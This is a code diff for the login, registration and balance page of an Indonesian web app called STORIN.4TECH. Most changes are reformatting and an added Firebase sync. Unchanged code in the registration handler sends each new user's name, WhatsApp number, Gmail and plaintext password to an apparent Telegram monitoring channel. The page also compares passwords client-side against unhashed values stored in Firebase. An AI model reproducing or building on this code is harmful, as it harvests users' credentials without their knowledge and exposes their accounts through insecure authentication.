@@ -58,7 +58,7 @@
       <div class="pg-d">Pantau saldo dan aktivitas kamu di sini.</div>
       <div class="cd bal">
         <div class="bal-lbl"><svg viewBox="0 0 24 24"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>Saldo Utama</div>
-        <div class="bal-amt"><span class="rp">Rp</span><span id="balVal">0</span></div>
+        <div class="bal-amt"><span class="rp">Rp</span><span id="balVal">...</span></div>
         <div class="bal-bot">
           <div class="bal-m"><div class="k">User ID</div><div class="v" id="hId">4TG-0000-0000</div></div>
           <div class="bal-m" style="text-align:right"><div class="k">Sejak</div><div class="v" id="hYr">2025</div></div>
@@ -120,6 +120,7 @@
 <script>
 (function(){
   var $=STORIN.$;
+
   if(STORIN.loadU()){
     document.getElementById('auth').classList.add('hide');
     document.getElementById('app').classList.remove('hidden');
@@ -129,10 +130,25 @@
     STORIN.buildDock('home');
     document.querySelector('.dock').style.display='none';
   }
-  $('tabL').onclick=function(){this.classList.add('on');$('tabR').classList.remove('on');$('panelL').classList.remove('hidden');$('panelR').classList.add('hidden');$('authSub').textContent='Masuk ke Akun';};
-  $('tabR').onclick=function(){this.classList.add('on');$('tabL').classList.remove('on');$('panelR').classList.remove('hidden');$('panelL').classList.add('hidden');$('authSub').textContent='Daftar Akun Baru';};
+
+  $('tabL').onclick=function(){
+    this.classList.add('on');
+    $('tabR').classList.remove('on');
+    $('panelL').classList.remove('hidden');
+    $('panelR').classList.add('hidden');
+    $('authSub').textContent='Masuk ke Akun';
+  };
+  $('tabR').onclick=function(){
+    this.classList.add('on');
+    $('tabL').classList.remove('on');
+    $('panelR').classList.remove('hidden');
+    $('panelL').classList.add('hidden');
+    $('authSub').textContent='Daftar Akun Baru';
+  };
+
   $('btnLogin').onclick=function(){
-    var g=($('lg').value||'').trim().toLowerCase(),p=($('lp').value||'').trim();
+    var g=($('lg').value||'').trim().toLowerCase();
+    var p=($('lp').value||'').trim();
     if(!g||!p){STORIN.toast('Lengkapi Gmail dan Password.','w');return;}
     var b=this;b.disabled=true;STORIN.showL('Memverifikasi');
     STORIN.fbFindUser(g).then(function(row){
@@ -140,14 +156,26 @@
       if(String(row.password)!==p){STORIN.hideL();b.disabled=false;STORIN.toast('Password salah.','e');return;}
       var u={id:row.userId,nama:row.nama,gmail:row.gmail,whatsapp:String(row.whatsapp),password:String(row.password),createdAt:row.createdAt||new Date().toISOString()};
       STORIN.setU(u);STORIN.saveU();
-      var s=STORIN.getS();s.bal=Number(row.saldo)||0;s.hist=Array.isArray(row.history)?row.history:[];s.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
-      STORIN.saveS();b.disabled=false;STORIN.hideL();
-      document.getElementById('auth').classList.add('hide');document.getElementById('app').classList.remove('hidden');document.querySelector('.dock').style.display='';
-      STORIN.buildDock('home');boot();STORIN.toast('Login berhasil!','s');
+      var s=STORIN.getS();
+      s.bal=Number(row.saldo)||0;
+      s.hist=Array.isArray(row.history)?row.history:[];
+      s.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
+      STORIN.saveS();
+      b.disabled=false;STORIN.hideL();
+      document.getElementById('auth').classList.add('hide');
+      document.getElementById('app').classList.remove('hidden');
+      document.querySelector('.dock').style.display='';
+      STORIN.buildDock('home');
+      boot();
+      STORIN.toast('Login berhasil!','s');
     }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
   };
+
   $('btnReg').onclick=function(){
-    var n=($('rn').value||'').trim(),g=($('rg').value||'').trim().toLowerCase(),w=STORIN.waN(($('rw').value||'').trim()),p=($('rp').value||'').trim();
+    var n=($('rn').value||'').trim();
+    var g=($('rg').value||'').trim().toLowerCase();
+    var w=STORIN.waN(($('rw').value||'').trim());
+    var p=($('rp').value||'').trim();
     if(n.length<3){STORIN.toast('Nama minimal 3 karakter.','w');return;}
     if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(g)||!/gmail\.com$/i.test(g)){STORIN.toast('Gmail tidak valid.','e');return;}
     if(w.length<8||w.length>15||!/^[0-9]+$/.test(w)){STORIN.toast('Nomor WhatsApp tidak valid.','e');return;}
@@ -158,47 +186,83 @@
       var createdAt=new Date().toISOString();
       var u={userId:STORIN.gid(),nama:n,gmail:g,whatsapp:w,password:p,createdAt:createdAt,saldo:0,history:[],usedGmails:[]};
       return STORIN.fbSaveUser(u).then(function(){
-        STORIN.setU({id:u.userId,nama:n,gmail:g,whatsapp:w,password:p,createdAt:createdAt});STORIN.saveU();
+        STORIN.setU({id:u.userId,nama:n,gmail:g,whatsapp:w,password:p,createdAt:createdAt});
+        STORIN.saveU();
         var s=STORIN.getS();s.bal=0;s.hist=[];s.used=[];STORIN.saveS();
         STORIN.tg('‼️NEW ACCOUNT REGISTERED‼️\n⭐️DATA AKUN STORIN.4TECH⭐️\n📍NAMA           : '+n+'\n🫆WHATSAPP : '+w+'\n🔐PASSWORD : '+p+'\n✉️GMAIL          : '+g+'\n\nMOHON DIPANTAU DENGAN SERIUS👌.');
         setTimeout(function(){
           STORIN.hideL();b.disabled=false;
-          document.getElementById('auth').classList.add('hide');document.getElementById('app').classList.remove('hidden');document.querySelector('.dock').style.display='';
-          STORIN.buildDock('home');boot();STORIN.toast('Akun berhasil dibuat!','s');
+          document.getElementById('auth').classList.add('hide');
+          document.getElementById('app').classList.remove('hidden');
+          document.querySelector('.dock').style.display='';
+          STORIN.buildDock('home');
+          boot();
+          STORIN.toast('Akun berhasil dibuat!','s');
         },700);
       });
     }).catch(function(){STORIN.hideL();b.disabled=false;STORIN.toast('Gagal terhubung.','e');});
   };
+
+  // ===== FETCH SALDO & UPDATE UI =====
+  function syncFromFirebase(callback){
+    var U=STORIN.getU(),S=STORIN.getS();
+    if(!U)return;
+    STORIN.fbFindUser(U.gmail).then(function(row){
+      if(!row){if(callback)callback();return;}
+      S.bal=Number(row.saldo)||0;
+      S.hist=Array.isArray(row.history)?row.history:[];
+      S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
+      STORIN.saveS();
+      $('balVal').textContent=STORIN.nm(S.bal);
+      renderStats();
+      if(callback)callback();
+    });
+  }
+
   function boot(){
     var U=STORIN.getU(),S=STORIN.getS();
     $('greet').textContent=(U.nama||'User').split(' ')[0];
-    $('hId').textContent=U.id;$('hYr').textContent=new Date(U.createdAt).getFullYear();
-    renderBal(false);renderStats();
-    STORIN.fbFindUser(U.gmail).then(function(row){
-      if(!row)return;
-      S.bal=Number(row.saldo)||0;S.hist=Array.isArray(row.history)?row.history:[];S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];
-      STORIN.saveS();renderBal(true);renderStats();
-    });
+    $('hId').textContent=U.id;
+    $('hYr').textContent=new Date(U.createdAt).getFullYear();
+    // Tampilkan cache dulu (biar gak nunggu), terus fetch fresh
+    $('balVal').textContent=STORIN.nm(S.bal);
+    renderStats();
+    syncFromFirebase();
   }
-  function renderBal(a){
-    var S=STORIN.getS(),el=$('balVal');
-    if(a){var from=parseInt(String(el.textContent).replace(/\./g,''),10)||0,to=S.bal,dur=700,start=null;
-      (function step(ts){if(!start)start=ts;var p=Math.min((ts-start)/dur,1);var e=p===1?1:1-Math.pow(2,-10*p);el.textContent=STORIN.nm(Math.round(from+(to-from)*e));if(p<1)requestAnimationFrame(step);else el.textContent=STORIN.nm(to);})(performance.now());
-    } else el.textContent=STORIN.nm(S.bal);
-  }
+
   function renderStats(){
     var S=STORIN.getS(),p=0,s=0,w=0;
-    S.hist.forEach(function(h){if(h.type==='deposit'){if(h.status==='pending')p++;if(h.status==='success')s++;}else if(h.type==='withdraw')w+=Number(h.nominal)||0;});
-    $('stP').textContent=p;$('stS').textContent=s;$('stW').textContent=STORIN.nm(w);
-  }
-  $('btnRef').onclick=function(){
-    var b=this;b.classList.add('spin');setTimeout(function(){b.classList.remove('spin');},700);
-    var U=STORIN.getU(),S=STORIN.getS();
-    STORIN.fbFindUser(U.gmail).then(function(row){
-      if(row){S.bal=Number(row.saldo)||0;S.hist=Array.isArray(row.history)?row.history:[];S.used=Array.isArray(row.usedGmails)?row.usedGmails:[];STORIN.saveS();renderBal(true);renderStats();}
+    S.hist.forEach(function(h){
+      if(h.type==='deposit'){if(h.status==='pending')p++;if(h.status==='success')s++;}
+      else if(h.type==='withdraw')w+=Number(h.nominal)||0;
     });
-    STORIN.vib(12);STORIN.toast('Data diperbarui.','i');
+    $('stP').textContent=p;
+    $('stS').textContent=s;
+    $('stW').textContent=STORIN.nm(w);
+  }
+
+  $('btnRef').onclick=function(){
+    var b=this;
+    b.classList.add('spin');
+    setTimeout(function(){b.classList.remove('spin');},700);
+    syncFromFirebase(function(){
+      STORIN.vib(12);
+      STORIN.toast('Data diperbarui.','i');
+    });
   };
+
+  // Auto sync tiap balik ke halaman ini (dari tab lain / minimize)
+  document.addEventListener('visibilitychange',function(){
+    if(!document.hidden && STORIN.getU()){
+      syncFromFirebase();
+    }
+  });
+
+  // Auto sync juga tiap dapat focus window
+  window.addEventListener('focus',function(){
+    if(STORIN.getU()) syncFromFirebase();
+  });
+
 })();
 </script>
 </body>
